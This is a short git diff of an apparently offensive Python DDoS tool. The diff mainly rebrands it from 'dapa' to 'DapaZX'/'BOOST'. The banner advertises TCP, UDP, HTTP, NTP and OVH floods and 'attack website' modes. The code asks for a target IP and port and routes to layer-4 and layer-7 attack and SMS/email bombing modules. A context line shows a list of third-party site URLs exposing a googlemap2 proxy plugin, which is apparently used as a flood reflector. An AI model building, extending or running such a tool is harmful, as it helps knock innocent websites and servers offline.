@@ -32,7 +32,7 @@ for i in range(3):
     j = 3
     if (pwd == pasw):
         time.sleep(3)
-        print("[0] Loading....... \n")
+        print("[0] try to connect \n")
         break
     else:
         time.sleep(2)
@@ -4161,13 +4161,13 @@ http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPAS
 ]
 
 print("------------------------------------------------")
-print("[+] Toools Created By dapaGanz")
-print("[+] Use Tools dapa DDOS V3")
+print("[1;34;40m' Tools Created By DapaZX")
+print("[+] Use Tools DapaZX DDOS")
 print("")
-print("[+]dapa Attack Cybers")
+print("[+] TESTING TOOLS!!")
 print("[+]attack website ON")
 print("[+]attack GTPS ON")
-print("[-] dapa || TCP || UDP || HTTP || DDOS || JETX || OVH || NTP")
+print("[-] BOOST || TCP || UDP || HTTP || DDOS || JETX || OVH || NTP")
 print("------------------------------------------------")
 ip = str(input(" IP / DOMAIN : "))
 port = int(input(" PORT : "))
@@ -4198,9 +4198,9 @@ def GetMethodByName(method):
         dir = "tools.SMS.main"
     elif method == "EMAIL":
         dir = "tools.EMAIL.main"
-    elif method in ("dapa", "UDP", "TCP", "NTP", "JETX", "OVH"):
+    elif method in ("BOOST", "UDP", "TCP", "NTP", "JETX", "OVH"):
         dir = f"tools.L4.{method.lower()}"
-    elif method in ("HTTP", "dapa", "TCP"):
+    elif method in ("HTTP", "BOOST", "TCP"):
         dir = f"tools.L7.{method.lower()}"
 
 def ddos():
